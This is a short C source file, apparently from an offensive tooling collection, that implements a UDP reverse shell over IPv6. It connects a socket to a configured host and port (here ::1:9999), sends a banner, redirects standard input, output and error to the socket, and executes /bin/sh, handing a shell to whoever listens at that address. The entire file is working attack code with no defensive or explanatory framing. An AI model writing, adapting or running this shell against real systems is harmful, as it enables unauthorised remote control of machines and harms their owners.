/* UDP reverse shell over IPv6 */

#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <string.h>

int main(int argc, char *argv[]){

	const char *host = "::1";
	int port = 9999;

	struct sockaddr_in6 address;
	address.sin6_family = AF_INET6;
	address.sin6_port = htons(port);
	inet_pton(AF_INET6, host, &address.sin6_addr);

	int s = socket(AF_INET6, SOCK_DGRAM, 0);
	connect(s, (struct sockaddr*)&address, sizeof(address));

	char buf[20];
	strcpy(buf, "Starting UDP shell\n");
	sendto(s, &buf, strlen(buf)+1, 0, (struct sockaddr*)&address, sizeof(address));

	/* Copy file descriptors */
	dup2(s, STDIN_FILENO);
	dup2(s, STDOUT_FILENO);
	dup2(s, STDERR_FILENO);

	execve("/bin/sh", NULL, NULL);

	return 0;
}
